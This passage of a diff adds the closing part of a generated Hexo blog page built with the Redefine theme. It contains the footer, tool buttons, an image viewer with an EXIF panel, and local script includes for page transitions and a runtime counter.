+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.9.0</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container" role="dialog" aria-modal="true" aria-label="图片查看器">
+	<button class="image-viewer-close" type="button" aria-label="关闭">
+		<i class="fa-solid fa-xmark"></i>
+	</button>
+	<button class="image-viewer-prev" type="button" aria-label="上一页">
+		<i class="fa-solid fa-chevron-left"></i>
+	</button>
+	<div class="image-viewer-frame">
+		<img src="" alt="">
+	</div>
+	<div class="image-viewer-exif-panel hidden absolute left-1/2 bottom-20 -translate-x-1/2 w-[min(92vw,420px)] max-h-[60vh] overflow-hidden rounded-2xl bg-background-color-transparent-80 p-4 text-left shadow-redefine-flat backdrop-blur-md" role="dialog" aria-label="EXIF" aria-hidden="true">
+		<div class="flex items-center justify-between mb-3">
+			<span class="text-sm font-semibold text-first-text-color">EXIF</span>
+			<button class="image-viewer-exif-close flex h-8 w-8 items-center justify-center rounded-full bg-background-color-transparent-80 text-first-text-color transition hover:bg-background-color-transparent-40" type="button" aria-label="关闭">
+				<i class="fa-solid fa-xmark text-[0.65rem]"></i>
+			</button>
+		</div>
+		<div class="image-viewer-exif-cards grid grid-cols-1 sm:grid-cols-2 gap-3 max-h-[50vh] overflow-y-auto pr-1 scrollbar-hide"></div>
+		<template class="image-viewer-exif-card-template">
+			<div class="rounded-lg bg-background-color-transparent-40 px-3 py-2">
+				<div class="image-viewer-exif-card-header flex items-center gap-2 mb-1">
+					<i class="image-viewer-exif-card-icon fa-solid fa-circle-info text-xs text-third-text-color"></i>
+					<div class="image-viewer-exif-card-title text-xs font-semibold text-first-text-color"></div>
+				</div>
+				<div class="image-viewer-exif-card-items flex flex-col gap-1"></div>
+			</div>
+		</template>
+	</div>
+	<button class="image-viewer-exif-toggle flex items-center gap-2 hidden absolute left-1/2 bottom-6 -translate-x-1/2 rounded-full border border-border-color bg-background-color-transparent-80 px-4 py-2 text-first-text-color backdrop-blur-md transition hover:bg-background-color-transparent-40" type="button" aria-label="EXIF" aria-expanded="false">
+		<i class="fa-solid fa-circle-info text-xs"></i>
+		<span class="text-xs font-semibold uppercase tracking-wider">EXIF</span>
+	</button>
+	<button class="image-viewer-next" type="button" aria-label="下一页">
+		<i class="fa-solid fa-chevron-right"></i>
+	</button>
+</div>
+
+
+	
+
+</main>
+
+
+
+<script src="js/build/libs/Swup.min.js"></script>
+
+<script src="js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    window.swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+
+    window.dispatchEvent(
+        new CustomEvent("redefine:swup:ready", {
+            detail: {
+                swup: window.swup,
+            },
+        }),
+    );
+</script>
+
+
+
+
+	
+<script src="js/build/main.js" type="module"></script>
+
+
+
+    
+<script src="js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="assets/odometer-theme-minimal.css">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+
+	
+</body>
+
+</html>
